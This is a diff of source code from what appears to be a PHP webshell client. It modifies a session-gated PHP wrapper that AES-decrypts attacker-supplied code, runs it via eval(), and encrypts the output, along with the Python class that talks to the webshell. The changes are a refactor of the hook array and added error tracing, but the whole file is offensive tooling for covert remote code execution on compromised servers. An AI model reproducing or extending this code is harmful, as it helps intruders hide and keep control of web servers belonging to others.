@@ -52,11 +52,10 @@ SUBMIT_WRAPPER_PHP = compress_phpcode_template(
     """\
 session_start();
 {decoder}
-$eg_decoder_hooks = array();
+$GLOBALS['eg_decoder_hooks'] = array();
 function decoder_echo($s) {{
-    global $eg_decoder_hooks;
-    for($i = 0; $i < count($eg_decoder_hooks); $i ++) {{
-        $f = $eg_decoder_hooks[$i];
+    for($i = 0; $i < count($GLOBALS['eg_decoder_hooks']); $i ++) {{
+        $f = $GLOBALS['eg_decoder_hooks'][$i];
         $s = $f($s);
     }}
     echo decoder_echo_raw($s);
@@ -621,7 +620,7 @@ function aes_dec($encryptedData) {
 if(!isset($_SESSION[{session_name}])){
     decoder_echo("WRONG_NO_SESSION");
 }else if(extension_loaded('openssl')) {
-    array_push($eg_decoder_hooks, "aes_enc");
+    array_push($GLOBALS['eg_decoder_hooks'], "aes_enc");
     $code = aes_dec({code_enc});
     eval($code);
 }else{
@@ -1325,6 +1324,8 @@ class PHPWebshellCommunication(PHPWebshellActions):
                 result = decrypt_aes256_cbc(self.aes_key, result_enc).decode("utf-8")
                 return result
             except Exception as exc:
+                import traceback
+                traceback.print_exc()
                 raise exceptions.PayloadOutputError("解密失败") from exc
 
         return wrap
